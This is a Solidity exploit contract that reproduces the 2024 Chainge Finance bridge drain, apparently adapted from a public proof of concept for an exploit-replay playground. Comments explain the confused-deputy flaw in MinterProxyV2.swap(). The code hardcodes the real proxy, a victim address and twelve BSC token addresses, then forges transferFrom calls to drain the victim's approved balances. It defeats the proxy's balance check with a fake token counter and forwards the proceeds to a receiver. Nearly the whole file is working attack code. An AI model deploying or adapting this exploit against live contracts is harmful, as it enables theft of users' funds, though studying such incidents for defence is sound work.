// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2024-04-ChaingeFinance).
//
// The DeFiHackLabs PoC (test/ChaingeFinance_exp.sol) runs the attack INLINE in
// the Foundry test contract: the test itself plays the role of the malicious
// `tokenAddr`/`receiveToken`/`receiver` passed into MinterProxyV2.swap() (its
// balanceOf/transfer/allowance/approve/transferFrom are all mocked no-ops or
// counters). There is no standalone contract to deploy. This contract is a
// faithful, self-contained copy of that inline attack so the playground can
// deploy it and record `run()`. Logic and constants are copied verbatim from
// the test.
//
// Root cause: MinterProxyV2.swap() is a PERMISSIONLESS function that makes a
// fully attacker-controlled external call `target.functionCall(callData)`
// (contracts_MinterProxyV2.sol:720). The only check on `target` is
// `target != address(this) && target != address(0)` — there is no allow-list
// of DEX/aggregator routers. The proxy holds standing MAX_UINT ERC20
// approvals from many bridge users, so setting `target = <real token>` and
// `callData = transferFrom(victim, attacker, amount)` turns the proxy into a
// confused deputy that steals from anyone who ever approved it. The
// post-call sanity check `new_balance > old_balance` is evaluated on
// `receiveToken`, which the caller ALSO chooses — pointing it at a
// self-controlled fake token (this contract) makes the guard vacuous.

interface IBEP20 {
    function balanceOf(address account) external view returns (uint256);
    function decimals() external view returns (uint8);
}

interface MinterProxyV2 {
    function swap(
        address tokenAddr,
        uint256 amount,
        address target,
        address receiveToken,
        address receiver,
        uint256 minAmount,
        bytes calldata callData,
        bytes calldata order
    ) external payable;
}

contract ChaingeFinanceDrain {
    // MinterProxyV2 — the vulnerable Chainge Finance bridge vault (BSC).
    MinterProxyV2 constant minterproxy = MinterProxyV2(0x80a0D7A6FD2A22982Ce282933b384568E5c852bF);

    // The victim who granted MAX_UINT allowances to the proxy on 12 tokens.
    address constant victim = 0x8A4AA176007196D48d39C89402d3753c39AE64c1;

    // Receiver of every drained token (set to the playground attacker EOA so
    // profit is measured there). Overridden via constructor for flexibility.
    address public immutable receiver;

    // Internal fake-balance counter this contract reports back to the proxy
    // as `receiveToken`'s balanceOf(this) — always growing, so the proxy's
    // "did I receive output?" guard (`new_balance > old_balance`) always
    // passes regardless of what real value moved.
    uint256 private fakeBalance;

    constructor(address _receiver) {
        receiver = _receiver;
    }

    // The 12 tokens the victim had approved to the proxy at the fork block.
    function _targets() private pure returns (address[12] memory) {
        return [
            address(0x55d398326f99059fF775485246999027B3197955), // USDT
            address(0x570A5D26f7765Ecb712C0924E4De545B89fD43dF), // SOL
            address(0x1CE0c2827e2eF14D5C4f29a091d735A204794041), // AVAX
            address(0xc748673057861a797275CD8A068AbB95A902e8de), // BabyDoge
            address(0xfb5B838b6cfEEdC2873aB27866079AC55363D37E), // FLOKI
            address(0x0Eb3a705fc54725037CC9e008bDede697f62F335), // ATOM
            address(0xb6C53431608E626AC81a9776ac3e999c5556717c), // TLOS
            address(0x9678E42ceBEb63F23197D726B29b1CB20d0064E5), // IOTX
            address(0x111111111117dC0aa78b770fA6A738034120C302), // 1INCH
            address(0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD), // LINK
            address(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c), // BTCB
            address(0x2170Ed0880ac9A755fd29B2688956BD959F933F8) // ETH
        ];
    }

    // The recorded entrypoint. Loops the 12 approved tokens, draining each
    // one via a MinterProxyV2.swap() call that carries a forged
    // `transferFrom(victim, this, amount)` as the arbitrary `callData`.
    function run() external {
        address[12] memory targets = _targets();
        for (uint256 i = 0; i < targets.length; i++) {
            _attack(targets[i]);
        }
    }

    function _attack(address targetToken) private {
        uint256 bal = IBEP20(targetToken).balanceOf(victim);
        if (bal == 0) return;

        bytes memory transferFromData = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)", victim, address(this), bal
        );

        // tokenAddr = this (fake token, no-op transferFrom/allowance/approve)
        // target    = the REAL token — receives the forged calldata
        // receiveToken = this (fake token, balanceOf is our own counter)
        // receiver  = this (proxy pays out the fake token to itself, harmless)
        minterproxy.swap(address(this), 1, targetToken, address(this), address(this), 1, transferFromData, hex"00");

        // Forward whatever real tokens landed here to the configured receiver.
        uint256 got = IBEP20(targetToken).balanceOf(address(this));
        if (got > 0) {
            (bool ok,) = targetToken.call(abi.encodeWithSignature("transfer(address,uint256)", receiver, got));
            ok; // best-effort; ignore return, mirrors the test's fire-and-forget style
        }
    }

    // --- fake token surface MinterProxyV2 calls on `tokenAddr`/`receiveToken`/`receiver` ---

    function balanceOf(address /*account*/ ) external view returns (uint256) {
        return fakeBalance;
    }

    function transfer(address, /*recipient*/ uint256 /*amount*/ ) external pure returns (bool) {
        return true;
    }

    function allowance(address, /*_owner*/ address /*spender*/ ) external pure returns (uint256) {
        return type(uint256).max;
    }

    function approve(address, /*spender*/ uint256 /*amount*/ ) external pure returns (bool) {
        return true;
    }

    function transferFrom(address, /*sender*/ address, /*recipient*/ uint256 amount) external returns (bool) {
        fakeBalance += amount;
        return true;
    }
}
